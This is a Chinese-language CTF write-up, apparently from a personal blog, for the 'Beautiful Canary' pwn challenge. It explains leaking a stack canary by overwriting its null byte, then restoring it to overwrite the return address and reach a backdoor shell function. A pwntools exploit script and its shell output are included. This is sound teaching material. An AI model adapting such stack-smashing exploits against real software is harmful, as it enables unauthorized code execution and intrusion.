---
title: "Beautiful Canary"
published: 2026-10-24
description: "利用两次输入泄露并恢复 Canary，再覆盖返回地址。"
tags: ["CTF", "Mini 2025", "Pwn", "Canary", "栈溢出"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

> Can you find canary?

## 漏洞分析
```c
unsigned __int64 vuln()
{
  int v1; // [rsp+Ch] [rbp-74h]
  int v2; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts(s: "The canary sings beautifully. What do you want to hear it sing?");
  v1 = read(fd: 0, buf, nbytes: 0x100u);
  if ( buf[v1 - 1] == 10 )
    buf[v1 - 1] = 0;
  printf(format: "Canary sings: %s ~\n", buf);
  puts(s: "Anything else you want to hear?");
  v2 = read(fd: 0, buf, nbytes: 0x100u);
  if ( buf[v2 - 1] == 10 )
    buf[v2 - 1] = 0;
  printf(format: "Canary sings: %s ~\n", buf);
  return v4 - __readfsqword(0x28u);
}
```
这道题题目就明显提醒我们这题有Canary。

由于这是伪代码，实际上执行的逻辑和显示的并不太一样，我们重点抓出几行来。
```c
unsigned __int64 v4; // [rsp+78h] [rbp-8h]
v4 = __readfsqword(0x28u);
return v4 - __readfsqword(0x28u);
```

两行中，``__readfsqword``就是从FS中读取，而FS+0x28，通常代表的就是存放Canary的地方，函数执行的时候从这里读取并保存。最后的return的逻辑在伪代码中表示的并不明确，我们直接看汇编的代码
```asm
   0x0000000000401380 <+232>:	mov    -0x8(%rbp),%rax
   0x0000000000401384 <+236>:	sub    %fs:0x28,%rax
   0x000000000040138d <+245>:	je     0x401394 <vuln+252>
   0x000000000040138f <+247>:	call   0x4010b0 <__stack_chk_fail@plt>
   0x0000000000401394 <+252>:	leave
```
可以看到这里将栈上保存的Canary, 也就是上面的v4复制到rax，然后减去内存中FS+28（也就是最开始从这里拿到v4的值），如果是1，就直接跳转到后面的+252的leave；如果是0，那就是执行后面的`__stack_chk_fail`直接终止程序。简单来说，就是检查v4这个canary的值有没有被修改，如果有，就终止程序，而我们看到上面标的v4在rbp-8的位置，如果我们要像是之前那样直接覆盖Saved RIP修改返回地址，那必然会修改到v4的值，从而导致程序直接罢工。

因此，这道题目给了我们两次的输入输出机会，我们可以在第一次输入输出流程中让printf把Canary输出，通常来说，Canary的第一个字节会是b"\x00"，这就是为了让puts和printf这样子的函数不要继续往后读取，但是，我们可以通过栈溢出，修改Canary的第一个字节，然后让printf输出剩下的后面7个字节，从而拼凑出一整个canary的值，接着在第二次输入的时候恢复canary的值，并在后面修改返回地址。至于修改成什么，这个可执行文件提供了一个backd00r函数执行sh，不需要我们再想办法getshell。

# exp
考虑栈对齐后
```python
from pwn import *
p = remote("HOST_REDACTED", 0)
payload = b"A" * 105
p.sendafter(b"?\n", payload)
p.recvuntil(b": ")
canary = p.recvline()[105:112]
canary = b"\x00" + canary
print("栈上保存的Canary的为", canary)
payload = b"A" * 104 + canary + b"B"*8 + p64(0x40101a) + p64(0x401264)
p.sendafter(b"?\n", payload)
p.interactive()
```
```zsh
❯ python -u "/home/copper0so4/Downloads/attachment/exp.py"
[/.......] Opening connection to HOST_REDACTED on port PORT_REDACTED: Trying 10[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
栈上保存的Canary的为 b'\x00\x9c\xbfEN\xadT.'
[*] Switching to interactive mode
Canary sings: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ~
$ cat flag
[FLAG REDACTED]
```
